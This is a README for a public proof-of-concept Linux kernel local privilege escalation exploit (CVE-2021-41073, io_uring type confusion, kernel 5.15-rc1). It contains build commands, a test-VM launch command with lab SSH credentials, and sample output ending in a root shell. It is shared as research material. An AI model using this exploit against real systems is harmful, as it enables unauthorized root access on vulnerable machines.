# Linux_LPE_io_uring_CVE-2021-41073

LPE exploit for CVE-2021-41073 io_uring type confusion vulnerability. 

Checkout the writeup [Put an io_uring on it: Exploiting the Linux Kernel](https://www.graplsecurity.com/post/iou-ring-exploiting-the-linux-kernel).

author: [@chompie1337](https://twitter.com/chompie1337)


**For educational/research purposes only. Not for use on testing or security evaulations.**

To build (requires [liburing](https://github.com/axboe/liburing)):

```
gcc -o hello hello.c -Wall -std=gnu99 `pkg-config fuse --cflags --libs`
gcc -I include/ -o exploit exploit.c bpf.c -l:liburing.a -lpthread
```

I've provided a [test VM](https://www.dropbox.com/s/lhmpzvhl8mdszc8/test_vm.tar.xz?dl=0) with a 5.15-rc1 kernel for testing/running the exploit. 

To start VM, extract [test_vm archive](https://www.dropbox.com/s/lhmpzvhl8mdszc8/test_vm.tar.xz?dl=0) and run: 
```
qemu-system-x86_64  -m 2G  -smp 2  -kernel /path/to/repo/Linux_LPE_io_uring_CVE-2021-41073/test_vm/bzImage    -append "console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0"     -drive file=/path/to/repo/Linux_LPE_io_uring_CVE-2021-41073/test_vm/stretch.img,format=raw -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 -net nic,model=e1000 -nographic  -pidfile vm.pid 2>&1 | tee vm.log
```

ssh into the box as unprivileged user:

```ssh -p 10021 hi@localhost```
password: lol

To run:
```
$ ./exploit
[+] set/getxattr file created
[+] bpf program loaded created
[+] FUSE maps created
[+] opened /proc/self/maps
[+] io_uring initialized
[+] spraying kmalloc-32 cache with io_buffer structs!!
[!] vuln trigger #1 for task_struct leak
[+] task_struct: ffff90740554c4c0
[!] vuln trigger #2 for KASLR leak 
[!] single_next: ffffffffb2064520
[!] vuln trigger #3 for cache ptr leak
[+] fake bpf_prog: ffff9074056aacb0
[!] vuln trigger #4 to overwrite socket filter
[+] it worked! have a r00t shell :)
```

Sometimes needs 3-4 attempts to get through entire exploit sequence. Reboot the VM after each exploit attempt time. Future work can be done to improve this exploit, techniques are provided in the writeup. Releasing the PoC for the strict purpose of sharing knowledge with other researchers, and those who want to learn about **advanced kernel exploitation**.

This exploit is a **PROOF OF CONCEPT** for the techniques discussed in the blog post, and achieve local privilege escalation of the Linux Kernel 5.15-rc-1 with default configurations. It is NOT my intent to tailor an exploit and weaponize it to work with every affected version of Linux. I've provided the code to demonstrate most of the discussed techniques, and have created and documented the techniques needed to bypass various mitigations that some distributions may enable in the accompanying blog post. 

The kernel configurations used in the provided testing VM are in the test_vm folder if you'd like to work with a custom built kernel. If you want to contribute, pull requests are welcome :)

This research was sponsered by [Grapl](https://www.graplsecurity.com/).
